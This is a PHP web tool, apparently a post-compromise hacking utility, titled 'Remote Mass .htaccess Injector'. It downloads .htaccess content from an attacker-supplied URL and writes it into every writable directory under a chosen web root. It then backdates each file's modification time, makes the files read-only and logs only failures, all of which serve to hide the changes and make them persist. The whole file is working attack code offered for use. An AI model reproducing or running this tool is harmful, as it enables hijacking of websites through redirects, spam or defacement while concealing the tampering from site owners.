<?php
// error_reporting(0); // Aktifkan di production untuk menyembunyikan error

// PERBAIKAN FATAL ERROR: Set batas waktu eksekusi menjadi 300 detik (5 menit)
set_time_limit(300);

$successLog = [];
$errorLog = [];
$showResults = false;
$totalFoldersFound = 0;
$processedCount = 0;
$successCount = 0; // Tambahkan penghitung sukses

function collectAllFolders($dir, &$allDirs) {
    // Membaca direktori menggunakan scandir
    $items = @scandir($dir);
    if ($items === false) return;
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        
        // Memastikan ini adalah direktori dan dapat dibaca
        if (is_dir($path) && is_readable($path)) {
            $allDirs[] = $path;
            // Rekursif untuk sub-folder
            collectAllFolders($path, $allDirs);
        }
    }
}

function sanitizePath($path) {
    return rtrim(str_replace(['../', '..\\'], '', $path), '/\\');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $showResults = true;
    
    $rawPath = sanitizePath($_POST['target_path'] ?? '');
    // realpath() akan mengembalikan FALSE jika path tidak valid/tidak ada
    $targetPath = @realpath($rawPath); 

    $htaccessUrl = trim($_POST['htaccess_url'] ?? '');

    // --- Validasi Input ---
    if ($targetPath === false) {
        $errorLog[] = "❌ Target directory path is invalid or inaccessible: <code>" . htmlspecialchars($rawPath) . "</code>";
    } elseif (empty($htaccessUrl)) {
        $errorLog[] = "❌ .htaccess URL is required.";
    } elseif (!is_dir($targetPath)) {
        $errorLog[] = "❌ Target directory not found: <code>" . htmlspecialchars($targetPath) . "</code>";
    } else {
        // --- Fetch Content ---
        $htaccessContent = @file_get_contents($htaccessUrl);

        if ($htaccessContent === false) {
            $errorLog[] = "❌ Failed to fetch .htaccess content from URL: <code>" . htmlspecialchars($htaccessUrl) . "</code>";
        } elseif (strlen($htaccessContent) > 50000) { 
            $errorLog[] = "❌ Remote file content is too large (max 50KB).";
        } else {
            // --- Collect and Process Directories ---
            $allDirs = [];
            
            // Kumpulkan SEMUA sub-folder
            collectAllFolders($targetPath, $allDirs);
            
            // Tambahkan direktori target itu sendiri ke daftar
            array_unshift($allDirs, $targetPath);
            
            $totalFoldersFound = count($allDirs);

            if (empty($allDirs)) {
                $errorLog[] = "❌ No directories found in target path";
            } else {
                $setTimeRaw = trim($_POST['set_time'] ?? '');
                $mtime = $setTimeRaw ? @strtotime($setTimeRaw) : time();

                // Proses SEMUA direktori
                foreach ($allDirs as $dir) {
                    $processedCount++;
                    $htaccessPath = $dir . '/.htaccess';
                    
                    // Cek apakah direktori dapat ditulis (penting!)
                    if (!@is_writable($dir)) {
                        $errorLog[] = "⚠️ Folder is not writable (skipping): <code>" . htmlspecialchars($dir) . "</code>";
                        continue;
                    }
                    
                    // --- Write .htaccess ---
                    if (@file_put_contents($htaccessPath, $htaccessContent) !== false) {
                        // Jika berhasil ditulis
                        $successCount++;
                        
                        // Set waktu modifikasi
                        if ($mtime !== false) {
                            @touch($htaccessPath, $mtime);
                        }
                        
                        // Set permission
                        @chmod($htaccessPath, 0444); 
                        
                        // TIDAK MENCATAT SUCCESS LOG
                        
                    } else {
                        // Jika gagal ditulis
                        $errorLog[] = "❌ Failed to deploy .htaccess to: <code>" . htmlspecialchars($htaccessPath) . "</code>";
                    }
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Remote Mass .htaccess Injector (Silent Success)</title>
    <style>
        /* CSS styles are the same for dark theme */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%); color: #00ff41; min-height: 100vh; padding: 20px; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); border: 2px solid #00ff41; border-radius: 10px; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #00ff41; }
        .header h1 { font-size: 2.5rem; text-shadow: 0 0 10px #00ff41; margin-bottom: 10px; }
        .header p { color: #888; font-size: 1.1rem; }
        .form-section { background: rgba(0, 20, 0, 0.5); padding: 25px; border-radius: 8px; border: 1px solid #004400; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #00ff41; font-size: 1.1rem; }
        .form-group input[type="text"] { width: 100%; padding: 12px; background: #000; border: 2px solid #333; border-radius: 5px; color: #00ff41; font-family: 'Courier New', monospace; font-size: 1rem; transition: all 0.3s ease; }
        .form-group input:focus { outline: none; border-color: #00ff41; box-shadow: 0 0 10px rgba(0, 255, 65, 0.3); }
        .upload-btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #00ff41, #00cc33); color: #000; border: none; border-radius: 8px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }
        .upload-btn:hover { background: linear-gradient(45deg, #00cc33, #009922); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4); }
        .results-section { margin-top: 30px; }
        .log-container { background: rgba(0, 0, 0, 0.7); border-radius: 8px; margin-bottom: 20px; overflow: hidden; border: 1px solid #333; }
        .log-header { padding: 15px; font-weight: bold; font-size: 1.2rem; border-bottom: 1px solid #333; }
        .success-header { background: rgba(0, 255, 65, 0.1); color: #00ff41; }
        .error-header { background: rgba(255, 51, 51, 0.1); color: #ff3333; }
        .summary-header { background: rgba(0, 150, 255, 0.1); color: #0096ff; }
        .log-content { padding: 15px; max-height: 300px; overflow-y: auto; }
        .log-entry { padding: 8px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1); font-size: 0.95rem; word-break: break-all; }
        .log-entry:last-child { border-bottom: none; }
        code { background: rgba(255, 255, 255, 0.1); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
        .stat-card { background: rgba(0, 0, 0, 0.5); padding: 20px; border-radius: 8px; border: 1px solid #333; text-align: center; }
        .stat-number { font-size: 2rem; font-weight: bold; color: #00ff41; display: block; }
        .stat-label { color: #888; margin-top: 5px; }
        .loading { display: none; text-align: center; margin: 20px 0; }
        .spinner { border: 4px solid rgba(0, 255, 65, 0.3); border-radius: 50%; border-top: 4px solid #00ff41; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .file-info { font-size: 0.9rem; color: #888; margin-top: 5px; }
        /* Hanya tampilkan form wajib */
        .hidden-group { display: none; } 
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Remote Mass .htaccess Injector</h1>
            <p>Deploy .htaccess recursively. Only failures are logged.</p>
        </div>
        <form method="POST" id="uploadForm">
            <div class="form-section">
                <div class="form-group">
                    <label for="target_path">🎯 Target Directory Path</label>
                    <input type="text" id="target_path" name="target_path" required placeholder="/var/www/html or /home/user/public_html" value="<?= htmlspecialchars($_POST['target_path'] ?? '') ?>">
                    <div class="file-info">Root directory for recursive deployment.</div>
                </div>

                <div class="form-group">
                    <label for="htaccess_url">📄 .htaccess File URL</label>
                    <input type="text" id="htaccess_url" name="htaccess_url" required placeholder="https://example.com/raw/htaccess.txt" value="<?= htmlspecialchars($_POST['htaccess_url'] ?? '') ?>">
                    <div class="file-info">Direct link to the raw .htaccess content.</div>
                </div>

                <div class="form-group">
                    <label for="set_time">⏰ Set File Modification Time (optional)</label>
                    <input type="text" id="set_time" name="set_time" placeholder="YYYY-MM-DD HH:MM:SS" value="<?= htmlspecialchars($_POST['set_time'] ?? '') ?>">
                    <div class="file-info">Leave blank to use current server time.</div>
                </div>
                <button type="submit" class="upload-btn" id="submitBtn">
                    🚀 Start .htaccess Deployment
                </button>
            </div>
        </form>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing all directories...</p>
        </div>
        <?php if ($showResults): ?>
        <div class="results-section">
            
            <?php if (!empty($errorLog)): ?>
            <div class="log-container">
                <div class="log-header error-header">❌ Error/Warning Log (<?= count($errorLog) ?> entries)</div>
                <div class="log-content">
                    <?php foreach ($errorLog as $log): ?>
                        <div class="log-entry"><?= $log ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php else: ?>
                <div class="log-container">
                <div class="log-header success-header">✅ Success! No errors were reported.</div>
                </div>
            <?php endif; ?>

            <div class="log-container">
                <div class="log-header summary-header">📊 Deployment Summary</div>
                <div class="stats">
                    <div class="stat-card">
                        <span class="stat-number"><?= $totalFoldersFound ?></span>
                        <div class="stat-label">Total Directories Found</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-number"><?= $processedCount ?></span>
                        <div class="stat-label">Directories Attempted</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-number"><?= $successCount ?></span>
                        <div class="stat-label">Successful Deployments</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-number"><?= count($errorLog) ?></span>
                        <div class="stat-label">Failed/Skipped Operations</div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>
    </div>
    <script>
        // JavaScript disederhanakan
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            const targetPath = document.getElementById('target_path').value.trim();
            const htaccessUrl = document.getElementById('htaccess_url').value.trim();
            
            if (!targetPath || !htaccessUrl) {
                alert('Please fill out Target Directory Path and .htaccess URL.');
                e.preventDefault();
                return;
            }

            // Show loading indicator
            document.getElementById('loading').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').innerHTML = '⏳ Processing All Directories...';
        });

        <?php if ($showResults): ?>
        // Auto-scroll to results after page load
        document.addEventListener('DOMContentLoaded', function() {
            const resultsSection = document.querySelector('.results-section');
            if (resultsSection) {
                resultsSection.scrollIntoView({ behavior: 'smooth' });
            }
        });
        <?php endif; ?>
    </script>
</body>
</html>
